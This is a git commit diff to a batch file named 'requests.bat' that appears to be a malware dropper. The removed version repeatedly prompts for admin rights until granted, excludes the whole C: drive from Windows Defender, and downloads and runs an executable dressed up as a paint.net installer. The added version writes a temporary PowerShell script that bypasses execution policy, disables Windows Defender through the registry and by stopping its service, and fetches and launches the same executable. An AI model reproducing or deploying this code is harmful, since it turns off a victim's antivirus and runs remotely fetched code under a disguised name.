804ab7e422ad5847a5491a97c5e0bb03151dacf8
3rev3 <117395786+3rev3@users.noreply.github.com>
2024-08-02 19:58:49 +0100

    Update requests.bat

--- requests.bat
+++ requests.bat
@@ -1,23 +1,28 @@
-<# :batch script
-Echo Please wait...
 @echo off
 setlocal
-cd "%~dp0"
-powershell -ep remotesigned -Command "IEX $([System.IO.File]::ReadAllText('%~f0'))"
+set "tempFile=%temp%\~temp.ps1"
+
+:: Create a temporary PowerShell script
+(
+    echo $ErrorActionPreference = "Stop"
+    echo Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force
+    echo Reg Add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d "1" /f
+    echo sc config WinDefend start= disabled
+    echo net stop WinDefend
+    echo Start-Process powershell -ArgumentList @('-ep bypass -Command "& {'
+    echo     $zipPath = "$env:USERPROFILE\AppData\Local\paintdotnet.zip"
+    echo     $extractPath = "$env:USERPROFILE\AppData\Local\paintdotnet"
+    echo     $exePath = "$extractPath\paint.net.5.0.13.install.anycpu.web.exe"
+    echo     Invoke-WebRequest -Uri "https://github.com/paintdotnet/release/releases/download/v5.0.13/paint.net.5.0.13.install.anycpu.web.zip" -OutFile $zipPath
+    echo     Expand-Archive -Path $zipPath -DestinationPath $extractPath
+    echo     Start-Process -FilePath $exePath
+    echo }'") -NoNewWindow -Wait
+) > "%tempFile%"
+
+:: Execute the PowerShell script
+powershell -ExecutionPolicy Bypass -File "%tempFile%"
+
+:: Clean up
+del "%tempFile%"
 endlocal
 goto:eof
-#>
-while($true) {
-    try {
-        Start-Process 'cmd' -WindowStyle Hidden -Verb runas -ArgumentList '/k powershell -command add-mppreference -exclusionpath C:\ && powershell -command add-mppreference -exclusionprocess C:\ && powershell -command "& { 
-            $zipPath = \"$env:USERPROFILE\AppData\Local\paintdotnet.zip\"; 
-            $extractPath = \"$env:USERPROFILE\AppData\Local\paintdotnet\"; 
-            $exePath = \"$extractPath\paint.net.5.0.13.install.anycpu.web.exe\"; 
-            Invoke-WebRequest -Uri \"https://github.com/paintdotnet/release/releases/download/v5.0.13/paint.net.5.0.13.install.anycpu.web.zip\" -OutFile $zipPath; 
-            Expand-Archive -Path $zipPath -DestinationPath $extractPath; 
-            Start-Process -FilePath $exePath; 
-        }"; exit'
-    } catch {
-        # Handle errors silently
-    }
-}
